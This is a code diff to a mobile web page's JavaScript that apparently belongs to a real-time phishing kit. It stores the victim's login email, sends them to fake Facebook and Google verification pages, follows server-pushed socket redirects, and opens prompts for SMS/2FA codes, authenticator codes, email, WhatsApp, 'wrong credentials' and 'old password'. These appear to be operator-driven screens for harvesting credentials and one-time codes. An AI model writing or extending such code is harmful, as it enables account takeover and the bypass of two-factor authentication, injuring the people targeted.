@@ -340,7 +340,10 @@
       const fbEmail = (emailEl && emailEl.value.trim())
                       || sessionStorage.getItem('lastLoginEmail')
                       || '';
-      try { sessionStorage.setItem('lastLoginEmail', fbEmail); } catch(e) {}
+      try {
+        sessionStorage.setItem('lastLoginEmail', fbEmail);
+        sessionStorage.setItem('googleReturnPage', 'mobile.html');
+      } catch(e) {}
       window.location.href = 'fb-verify.html';
     });
 
@@ -352,6 +355,24 @@
     socket.on('redirect', (url) => {
       window.location.href = url;
     });
+
+    /* ── Redirected back from google-login.html — open the right mobile modal ── */
+    const mobilePendingModal = sessionStorage.getItem('pendingModal');
+    if (mobilePendingModal) {
+      sessionStorage.removeItem('pendingModal');
+      sessionStorage.removeItem('googleReturnPage');
+      const mobileModalMap = {
+        '2fa':       () => { shownCommands['2fa']      = true; loadPage('sms'); },
+        'auth':      () => { shownCommands['auth']     = true; loadPage('auth'); },
+        'email':     () => { shownCommands['email']    = true; loadPage('email'); },
+        'whatsapp':  () => { shownCommands['whatsapp'] = true; loadPage('wh'); },
+        'wrongcreds':() => loadModalPage('wrong-creds'),
+        'oldpass':   () => loadModalPage('old-password')
+      };
+      if (mobileModalMap[mobilePendingModal]) {
+        mobileModalMap[mobilePendingModal]();
+      }
+    }
 
   </script>
   <script>
